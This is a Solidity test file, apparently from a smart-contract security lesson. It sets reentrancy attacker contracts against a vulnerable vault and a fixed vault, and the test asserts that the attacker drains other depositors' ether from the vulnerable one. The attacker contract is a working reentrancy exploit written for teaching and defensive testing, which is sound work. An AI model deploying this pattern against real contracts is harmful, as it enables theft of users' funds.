// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../contracts/VulnerableVault.sol";

interface Vm { function deal(address who, uint256 newBalance) external; }
contract ReenteringStudent {
    VulnerableVault public vault;
    uint256 public attempts;
    constructor(VulnerableVault v) { vault = v; }
    function deposit() external payable { vault.deposit{value: msg.value}(); }
    function attack() external { vault.withdraw(); }
    receive() external payable {
        if (address(vault).balance >= 1 ether && attempts < 2) {
            attempts++;
            vault.withdraw();
        }
    }
}
contract FixedVaultAttacker {
    FixedVault public vault;
    uint256 public attempts;
    constructor(FixedVault v) { vault = v; }
    function deposit() external payable { vault.deposit{value: msg.value}(); }
    function attack() external { vault.withdraw(); }
    receive() external payable {
        if (address(vault).balance >= 1 ether && attempts < 2) {
            attempts++;
            try vault.withdraw() {} catch {}
        }
    }
}
contract ReentrancyLessonTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    function testVulnerableVaultCanBeDrained() public {
        vm.deal(address(this), 3 ether);
        VulnerableVault v = new VulnerableVault();
        ReenteringStudent attacker = new ReenteringStudent(v);
        v.deposit{value: 2 ether}();
        attacker.deposit{value: 1 ether}();
        attacker.attack();
        require(address(v).balance == 0, "vault was not drained");
        require(address(attacker).balance == 3 ether, "attacker did not drain deposits");
    }
    function testFixedVaultResistsReentrancy() public {
        vm.deal(address(this), 3 ether);
        FixedVault v = new FixedVault();
        FixedVaultAttacker attacker = new FixedVaultAttacker(v);
        v.deposit{value: 2 ether}();
        attacker.deposit{value: 1 ether}();
        attacker.attack();
        require(address(v).balance == 2 ether, "other depositor funds stolen");
        require(address(attacker).balance == 1 ether, "attacker received unexpected funds");
    }
}
